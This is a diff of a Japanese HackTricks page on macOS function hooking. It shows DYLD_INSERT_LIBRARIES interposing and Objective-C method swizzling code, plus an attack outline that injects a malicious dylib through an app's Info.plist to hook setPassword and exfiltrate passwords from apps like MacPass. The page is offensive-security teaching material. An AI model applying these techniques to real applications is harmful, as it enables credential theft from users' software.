@@ -1,26 +1,27 @@
-# macOS関数フック
+# macOS Function Hooking
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>htARTE（HackTricks AWS Red Team Expert）</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>でゼロからヒーローまでAWSハッキングを学ぶ</strong></a><strong>！</strong></summary>
+<summary>Support HackTricks</summary>
 
-HackTricksをサポートする他の方法：
-
-- **HackTricksで企業を宣伝したい**か**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
-- [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
-- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
-- **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**または[Telegramグループ](https://t.me/peass)に**参加**するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)を**フォロー**する。
-- **ハッキングトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **および** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
-## 関数インターポージング
+## Function Interposing
 
-**`__interpose`**セクション（または**`S_INTERPOSING`**フラグが付いたセクション）を含む**関数ポインタ**のタプルを持つ**dylib**を作成し、**元の**関数と**置換**関数を参照します。
+**`__interpose`** セクション（または **`S_INTERPOSING`** フラグが付けられたセクション）を持つ **dylib** を作成し、**元の** 関数と **置き換え** 関数を参照する **関数ポインタ** のタプルを含めます。
 
-その後、**`DYLD_INSERT_LIBRARIES`**でdylibを**インジェクト**します（インターポージングはメインアプリがロードされる前に発生する必要があります）。明らかに、[**`DYLD_INSERT_LIBRARIES`**の使用に適用される**制限**はここでも適用されます](../macos-proces-abuse/macos-library-injection/#check-restrictions)。&#x20;
+次に、**`DYLD_INSERT_LIBRARIES`** を使用して dylib を **注入** します（インターポジングはメインアプリがロードされる前に行う必要があります）。明らかに、[**`DYLD_INSERT_LIBRARIES`** の使用に適用される **制限** もここに適用されます](../macos-proces-abuse/macos-library-injection/#check-restrictions)。&#x20;
 
-### printfをインターポース
+### Interpose printf
 
 {% tabs %}
 {% tab title="interpose.c" %}
@@ -59,41 +60,6 @@ return 0;
 {% endtab %}
 
 {% tab title="interpose2.c" %}
-
-### macOS Function Hooking
-
-macOS provides a feature called Interpose, which allows you to intercept and replace functions in shared libraries. This can be used for various purposes, including debugging, logging, and even modifying the behavior of applications.
-
-To use Interpose, you need to create a new shared library that contains the replacement functions. Then, you can use the `DYLD_INSERT_LIBRARIES` environment variable to load your library into the target process and intercept the desired functions.
-
-Here is an example of using Interpose to hook the `open` function:
-
-```c
-#define _DARWIN_C_SOURCE
-#include <stdio.h>
-#include <dlfcn.h>
-
-int (*original_open)(const char *path, int oflag, ...);
-
-int my_open(const char *path, int oflag, ...) {
-    // Your custom implementation here
-}
-
-__attribute__((constructor))
-void init() {
-    original_open = dlsym(RTLD_NEXT, "open");
-    if (original_open == NULL) {
-        fprintf(stderr, "Error hooking open\n");
-    }
-    printf("Hooked open function\n");
-}
-```
-
-In this example, the `init` function is called when the library is loaded into the process. It uses `dlsym` to get a reference to the original `open` function, which is then replaced with `my_open`. This allows you to intercept and modify the behavior of the `open` function.
-
-Remember that function hooking can be a powerful technique, but it should be used responsibly and ethically. Improper use of function hooking can lead to instability and security vulnerabilities in the target system.
-
-{% endtab %}
 ```c
 // Just another way to define an interpose
 // gcc -dynamiclib interpose2.c -o interpose2.dylib
@@ -126,23 +92,23 @@ Hello from interpose
 DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
 Hello from interpose
 ```
-## メソッドスウィズリング
+## メソッドスワッピング
 
 ObjectiveCでは、メソッドは次のように呼び出されます: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**
 
-**オブジェクト**、**メソッド**、**パラメータ**が必要です。メソッドが呼び出されると、**`objc_msgSend`** 関数を使用して **msg が送信**されます: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
+**オブジェクト**、**メソッド**、および**パラメータ**が必要です。そして、メソッドが呼び出されると、**msgが送信されます**。これは関数**`objc_msgSend`**を使用します: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`
 
-オブジェクトは **`someObject`**、メソッドは **`@selector(method1p1:p2:)`** で、引数は **value1**、**value2** です。
+オブジェクトは**`someObject`**、メソッドは**`@selector(method1p1:p2:)`**、引数は**value1**、**value2**です。
 
-オブジェクト構造に従って、メソッドの **名前** と **メソッドコードへのポインタ** が **格納**されている **メソッドの配列** にアクセスすることができます。
+オブジェクトの構造に従って、**メソッドの配列**にアクセスすることが可能で、そこには**名前**と**メソッドコードへのポインタ**が**格納されています**。
 
 {% hint style="danger" %}
-メソッドやクラスは名前に基づいてアクセスされるため、この情報はバイナリに保存されているため、`otool -ov </path/bin>` または [`class-dump </path/bin>`](https://github.com/nygard/class-dump) を使用して取得することができます。
+メソッドとクラスはその名前に基づいてアクセスされるため、この情報はバイナリに保存されます。したがって、`otool -ov </path/bin>`または[`class-dump </path/bin>`](https://github.com/nygard/class-dump)を使用して取得することが可能です。
 {% endhint %}
 
 ### 生のメソッドへのアクセス
 
-次の例のように、メソッドの情報（名前、パラメータ数、アドレスなど）にアクセスすることができます。
+次の例のように、メソッドの情報（名前、パラメータの数、アドレスなど）にアクセスすることが可能です:
 ```objectivec
 // gcc -framework Foundation test.m -o test
 
@@ -208,12 +174,12 @@ NSLog(@"Uppercase string: %@", uppercaseString3);
 return 0;
 }
 ```
-### method\_exchangeImplementationsを使用したメソッドスイズリング
+### Method Swizzling with method\_exchangeImplementations
 
-関数**`method_exchangeImplementations`**は、**1つの関数の実装のアドレスを他の関数に変更**することを可能にします。
+関数 **`method_exchangeImplementations`** は **一つの関数の実装のアドレスを他の関数に変更する**ことを可能にします。
 
 {% hint style="danger" %}
-したがって、関数が呼び出されるときには、**実行されるのは他の関数**です。
+したがって、関数が呼び出されると、**実行されるのは他の関数です**。
 {% endhint %}
 ```objectivec
 //gcc -framework Foundation swizzle_str.m -o swizzle_str
@@ -259,16 +225,16 @@ return 0;
 }
 ```
 {% hint style="warning" %}
-この場合、**正規**メソッドの**実装コード**が**メソッド名**を**検証**すると、このスウィズリングを**検出**して実行を防ぐことができます。
+この場合、**正当な**メソッドの**実装コード**が**メソッド**の**名前**を**検証**する場合、このスウィズリングを**検出**し、実行を防ぐことができます。
 
-次のテクニックにはこの制限がありません。
+次の技術にはこの制限はありません。
 {% endhint %}
 
-### method\_setImplementationを使用したメソッドスウィズリング
+### method\_setImplementationによるメソッドスウィズリング
 
-前の形式は奇妙です。なぜなら、1つのメソッドの実装をもう1つのメソッドに変更しているからです。**`method_setImplementation`** 関数を使用すると、1つのメソッドの**実装**を**他のメソッド**に変更できます。
+前の形式は奇妙です。なぜなら、あなたは2つのメソッドの実装を互いに変更しているからです。関数**`method_setImplementation`**を使用すると、**他のメソッドのためにメソッドの**実装を**変更**できます。
 
-新しい実装から呼び出す場合は、後でそのアドレスを特定するのが難しくなるため、**元の実装のアドレスを保存**してから上書きすることを忘れないでください。
+新しい実装から元の実装を呼び出す予定がある場合は、上書きする前に**元の実装のアドレスを保存する**ことを忘れないでください。後でそのアドレスを見つけるのははるかに複雑になります。
 ```objectivec
 #import <Foundation/Foundation.h>
 #import <objc/runtime.h>
@@ -320,17 +286,17 @@ return 0;
 }
 }
 ```
-## フック攻撃方法論
+## フッキング攻撃の方法論
 
-このページでは、関数をフックするさまざまな方法について説明しました。ただし、これらは**プロセス内でコードを実行して攻撃する**というものでした。
+このページでは、関数をフックするさまざまな方法について説明しました。しかし、これらは**攻撃のためにプロセス内でコードを実行する**ことを含んでいました。
 
-そのためには、最も簡単な技術としては、[Dyldを環境変数またはハイジャックを介して注入する](../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)という方法があります。ただし、[Dylibプロセスインジェクション](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)を介して行うこともできると思われます。
+そのために、最も簡単な技術は、[環境変数を介してDyldを注入するか、ハイジャックすること](../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)です。しかし、これも[タスクポートを介したDylibプロセス注入](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port)を通じて行うことができると思います。
 
-ただし、これらのオプションは**保護されていない**バイナリ/プロセスに**限定**されています。制限について詳しく知るには、各技術を確認してください。
+ただし、両方のオプションは**保護されていない**バイナリ/プロセスに**制限**されています。各技術を確認して、制限について詳しく学んでください。
 
-ただし、関数フック攻撃は非常に特定されたものであり、攻撃者はこれを行って**プロセス内の機密情報を盗み出す**ことを意図しています（そうでなければプロセスインジェクション攻撃を行うでしょう）。そして、この機密情報はMacPassなどのユーザーがダウンロードしたアプリケーション内に存在する可能性があります。
+ただし、関数フッキング攻撃は非常に特定的であり、攻撃者は**プロセス内から機密情報を盗む**ためにこれを行います（そうでなければ、プロセス注入攻撃を行うだけです）。この機密情報は、MacPassなどのユーザーがダウンロードしたアプリに存在する可能性があります。
 
-したがって、攻撃者の手法は、脆弱性を見つけるか、アプリケーションの署名を削除し、Info.plistを介して**`DYLD_INSERT_LIBRARIES`**環境変数を注入することです。以下のようなものを追加します：
+したがって、攻撃者のベクターは、脆弱性を見つけるか、アプリケーションの署名を剥がし、アプリケーションのInfo.plistを介して**`DYLD_INSERT_LIBRARIES`**環境変数を注入し、次のようなものを追加することになります：
 ```xml
 <key>LSEnvironment</key>
 <dict>
@@ -338,7 +304,7 @@ return 0;
 <string>/Applications/Application.app/Contents/malicious.dylib</string>
 </dict>
 ```
-そしてアプリケーションを**再登録**してください：
+そして、アプリケーションを**再登録**します：
 
 {% code overflow="wrap" %}
 ```bash
@@ -346,10 +312,10 @@ return 0;
 ```
 {% endcode %}
 
-そのライブラリに、情報を外部に送信するフックコードを追加します：パスワード、メッセージ...
+そのライブラリに情報を外部流出させるためのフックコードを追加します: パスワード、メッセージ...
 
 {% hint style="danger" %}
-新しいバージョンのmacOSでは、アプリケーションバイナリの署名を**削除**し、それが以前に実行されていた場合、macOSはもはやそのアプリケーションを実行しなくなります。
+新しいバージョンのmacOSでは、アプリケーションバイナリの**署名を削除**し、以前に実行されていた場合、macOSは**アプリケーションを実行しなくなります**ので注意してください。
 {% endhint %}
 
 #### ライブラリの例
@@ -388,18 +354,21 @@ IMP fake_IMP = (IMP)custom_setPassword;
 real_setPassword = method_setImplementation(real_Method, fake_IMP);
 }
 ```
-## 参考
+## 参考文献
 
 * [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)
 
+{% hint style="success" %}
+AWSハッキングを学び、実践する：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+GCPハッキングを学び、実践する：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>
+<summary>HackTricksをサポートする</summary>
 
-HackTricks をサポートする他の方法:
+* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)を確認してください！
+* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**テレグラムグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローしてください。**
+* **ハッキングのトリックを共有するには、[**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**
 
-* **HackTricks で企業を宣伝したい** または **HackTricks をPDFでダウンロードしたい場合は** [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) をチェックしてください！
-* [**公式PEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を入手する
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)コレクションを見つける
-* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)** に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 で **@carlospolopm** をフォローする
-* **ハッキングトリックを共有するために** [**HackTricks**](https://github.com/carlospolop/hacktricks) と [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) のGitHubリポジトリにPRを提出する
+</details>
+{% endhint %}
